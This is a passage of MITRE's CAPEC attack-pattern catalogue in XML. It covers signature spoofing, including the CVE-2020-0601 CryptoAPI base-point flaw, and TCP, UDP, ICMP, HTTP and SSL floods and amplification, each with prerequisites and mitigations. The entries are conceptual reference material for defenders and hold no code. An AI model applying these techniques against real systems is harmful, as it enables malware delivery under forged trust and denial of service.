            <ns0:Related_Weakness CWE_ID="680" />
            <ns0:Related_Weakness CWE_ID="697" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Skills_Required</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="473" Name="Signature Spoof" Abstraction="Standard" Status="Draft">
         <ns0:Description>An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <ns0:Exclude_Related Exclude_ID="515" />
               <ns0:Exclude_Related Exclude_ID="512" />
               <ns0:Exclude_Related Exclude_ID="403" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.</ns0:Prerequisite>
            <ns0:Prerequisite>The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Technical understanding of how signature verification algorithms work with data and applications</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences><ns0:Consequence>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Example_Instances>
            <ns0:Example>An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.</ns0:Example>
            <ns0:Example>An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="327" />
            <ns0:Related_Weakness CWE_ID="290" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1036.001</ns0:Entry_ID>
               <ns0:Entry_Name>Masquerading: Invalid Code Signature</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1553.002</ns0:Entry_ID>
               <ns0:Entry_Name>Subvert Trust Controls: Code Signing</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="475" Name="Signature Spoofing by Improper Validation" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Signature verification algorithms are generally used to determine whether a certificate or piece of code (e.g. executable, binary, etc.) possesses a valid signature and can be trusted.</html:p>
            <html:p>If the leveraged algorithm confirms that a valid signature exists, it establishes a foundation of trust that is further conveyed to the end-user when interacting with a website or application. However, if the signature verification algorithm improperly validates the signature, either by not validating the signature at all or by failing to fully validate the signature, it could result in an adversary generating a spoofed signature and being classified as a legitimate entity. Successfully exploiting such a weakness could further allow the adversary to reroute users to malicious sites, steals files, activates microphones, records keystrokes and passwords, wipes disks, installs malware, and more.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>Low</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="542" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="High">Cryptanalysis of signature verification algorithm</ns0:Skill>
            <ns0:Skill Level="High">Reverse engineering and cryptanalysis of signature verification algorithm implementation</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Mitigations>
            <ns0:Mitigation>Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>The Windows CryptoAPI (Crypt32.dll) was shown to be vulnerable to signature spoofing by failing to properly validate Elliptic Curve Cryptography (ECC) certificates. If the CryptoAPI's signature validator allows the specification of a nonstandard base point (G): "An adversary can create a custom ECDSA certificate with an elliptic curve (ECC) signature that appears to match a known standard curve, like P-256 that includes a public key for an existing known trusted certificate authority, but which was in fact not signed by that certificate authority. Windows checks the public key and other curve parameters, but not the (bespoke adversary-supplied) base point generator (G) parameter constant which actually generated the curve" [REF-562]. Exploiting this vulnerability allows the adversary to leverage a spoofed certificate to dupe trusted network connections and deliver/execute malicious code, while appearing as legitimately trusted entity [REF-563]. This ultimately tricks the victim into believing the malicious website or executable is legitimate and originates from a properly verified source. See also: CVE-2020-0601</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="347" />
            <ns0:Related_Weakness CWE_ID="327" />
            <ns0:Related_Weakness CWE_ID="295" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-562" />
            <ns0:Reference External_Reference_ID="REF-563" />
            <ns0:Reference External_Reference_ID="REF-564" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, References, Related_Attack_Patterns, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="482" Name="TCP Flood" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain. This often involves the use of TCP SYN messages.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1498.001</ns0:Entry_ID>
               <ns0:Entry_Name>Network Denial of Service: Direct Network Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.001</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service: OS Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.002</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service: Service Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="486" Name="UDP Flood" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>To mitigate this type of an attack, modern firewalls drop UDP traffic destined for closed ports, and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="487" Name="ICMP Flood" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>To mitigate this type of an attack, an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="488" Name="HTTP Flood" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use a Web Application Firewall (WAF) to help filter out malicious traffic. This can be setup with rules to block IP addresses found in IP reputation databases, which contains lists of known bad IP addresses. Analysts should also monitor when the traffic flow becomes abnormally large, and be able to add on-the-fly rules to block malicious traffic. Special care should be taken to ensure low false positive rates in block rules and functionality should be implemented to allow a legitimate user to resume sending traffic if they have been blocked.</ns0:Mitigation>
            <ns0:Mitigation>Hire a third party provider to implement a Web Application Firewall (WAF) for your application. Third party providers have dedicated resources and expertise that could allow them to update rules and prevent HTTP Floods very quickly.</ns0:Mitigation>
            <ns0:Mitigation>Design: Use a load balancer such as nginx to prevent small scale HTTP Floods by dispersing traffic between a group of servers.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Make a requesting machine solve some kind of challenge before allowing them to send an HTTP request. This could be a captcha or something similar that works to deter bots.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.002</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service:Service Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-751" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2023-01-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations, References</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="489" Name="SSL Flood" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125" />
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
            <ns0:Mitigation>To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="770" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1499.002</ns0:Entry_ID>
               <ns0:Entry_Name>Endpoint Denial of Service:Service Exhaustion Flood</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="490" Name="Amplification" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.</ns0:Description>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125">
               <ns0:Exclude_Related Exclude_ID="512" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Mitigations>
